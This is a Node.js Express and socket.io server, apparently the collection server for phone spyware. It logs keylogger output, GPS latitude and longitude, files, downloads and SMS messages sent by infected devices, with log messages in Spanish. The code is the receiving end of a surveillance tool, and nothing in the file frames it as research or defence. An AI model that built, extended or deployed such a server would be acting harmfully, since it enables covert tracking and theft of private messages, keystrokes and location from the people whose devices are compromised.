'use strict';


const express = require('express'),
fs = require('fs'),
http = require('http'),
app = express(),
port = 8080,
server = http.createServer(app),

io = require('socket.io').listen(server);

app.get('/', (req, res) => {
res.send('Node server running')
});




io.sockets.on('connection', (socket) => {



socket.on('join', function(userNickname) {

	console.log('Conexion establecida.')
        console.log('Nuevo dispositivo: ' + userNickname);

   })


socket.on('keylogger', (sender, messageContent) => {

	console.log('KEYLOGGER del dispositivo: ' + sender + '\n' 
			+ ' | Datos: ' + messageContent)
   })

socket.on('localizacion', (senderNickname, messageContent) => {

	console.log('Localizacion del dispositivo: ' + senderNickname + '\n')
   })

socket.on('longitud', (senderNickname, messageContent) => {
		console.log('Longitud: ' + messageContent)
   })

socket.on('latitud', (senderNickname, messageContent) => {
		console.log('Latitud: ' + messageContent)
   })

socket.on('file', (senderNickname, messageContent) => {
		console.log('Archivo: ' + messageContent)
   })

socket.on('download', (senderNickname, messageContent) => {
		console.log(messageContent)
   })

socket.on('separator', (senderNickname, messageContent) => {
		console.log('\n\t\t*************\n')
   })


socket.on('sms', (senderNickname, messageContent) => {
		console.log('Mensaje: ' + messageContent)
   })

socket.on('new', (senderNickname, messageContent) => {
		console.log(messageContent)
   })


})



server.listen(port,()=>{

console.log('Servidor en ejecución.')

})





